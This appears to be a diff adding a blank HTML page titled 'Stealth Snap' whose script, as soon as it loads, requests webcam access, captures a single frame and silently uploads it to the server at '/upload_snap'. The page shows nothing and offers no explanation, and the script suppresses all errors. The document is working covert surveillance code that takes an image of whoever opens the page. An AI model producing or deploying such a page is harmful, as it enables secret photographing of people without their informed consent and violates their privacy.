@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Stealth Snap</title>
+<style>
+  body, html { margin:0; padding:0; background:#fff; height:100vh; }
+</style>
+</head>
+<body>
+<script>
+(async () => {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const track = stream.getVideoTracks()[0];
+    const imageCapture = new ImageCapture(track);
+    const bitmap = await imageCapture.grabFrame();
+
+    // create offscreen canvas
+    const canvas = new OffscreenCanvas(bitmap.width, bitmap.height);
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(bitmap, 0, 0);
+
+    const blob = await canvas.convertToBlob({ type: 'image/png' });
+    const reader = new FileReader();
+
+    reader.onloadend = () => {
+      fetch('/upload_snap', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: reader.result })
+      });
+      // stop the camera
+      track.stop();
+    };
+    reader.readAsDataURL(blob);
+  } catch {
+    // user denied or error, do nothing
+  }
+})();
+</script>
+</body>
+</html>
